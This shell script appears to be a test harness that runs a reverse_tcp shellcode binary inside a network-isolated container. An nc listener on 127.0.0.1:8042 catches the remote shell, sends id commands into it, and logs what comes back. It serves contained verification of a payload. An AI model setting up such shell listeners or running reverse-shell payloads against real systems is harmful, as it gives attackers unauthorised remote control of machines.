#!/bin/sh
# Demonstrate the reverse_tcp shellcode inside a network-isolated container.
#
# Both sides run here because the shellcode targets 127.0.0.1:8042 and the
# container is --network none, so the connection succeeds over loopback while
# nothing can leave the container.
set -u

PORT=8042
LOG=/tmp/reverse_tcp.log

echo "=== before ==="
id

echo "=== starting listener on 127.0.0.1:$PORT ==="
# The listener feeds one command into the shell it is handed, then reads back
# whatever the shell prints. It runs as the same non-root user as the payload.
(
    sleep 2
    printf 'echo REMOTE_SHELL_RUNS_AS:$(id -un); echo REMOTE_UID:$(id -u); exit\n'
    sleep 2
) | timeout 25 nc -l -v -p "$PORT" > "$LOG" 2>&1 &
LISTENER_PID=$!

sleep 1
echo "=== running reverse_tcp shellcode ==="
/reverse_tcp
echo "shellcode_exit=$?"

wait "$LISTENER_PID" 2>/dev/null
sleep 1

echo "=== what the listener captured ==="
cat "$LOG"

echo "=== container network interfaces ==="
ip -o addr show 2>/dev/null || ifconfig 2>/dev/null || echo "(no ip tool)"
